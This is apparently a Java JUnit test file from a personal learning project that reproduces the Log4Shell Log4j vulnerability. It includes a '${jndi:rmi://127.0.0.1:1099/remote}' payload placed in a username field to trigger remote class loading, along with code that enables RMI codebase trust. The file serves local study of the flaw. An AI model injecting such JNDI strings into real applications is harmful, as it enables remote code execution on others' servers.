package top.javahai.vod.test;

/**
 * @author Hai
 * @program: learn-everyday
 * @description:
 * @create 2021/12/12 - 23:10
 **/

import local.App;
import org.apache.commons.logging.LogFactory;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Test;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class TestApp {

    private static Logger log = LogManager.getLogger(TestApp.class);

    /**
     * 测试获取资源
     */
    @Test
    public void testJndi(){
        try {
            //这里由于我使用的是 jdk 181,jdk 版本大于 181，需要手动设置为 true
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
            String uri = "rmi://127.0.0.1:1099/remote";
            InitialContext initialContext = new InitialContext();
            Object lookup = initialContext.lookup(uri);
            System.out.println(lookup);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }

    /**
     * 测试攻击
     */
    @Test
    public void testRegister(){
        //估计使用拼接的攻击代码
        String username = "${jndi:rmi://127.0.0.1:1099/remote}";

        App app = new App();
        app.register(username);

    }


    @Test
    public void testLog4j() {
        log.info("${java:os}");
        log.error("${java:version}");
    }

}

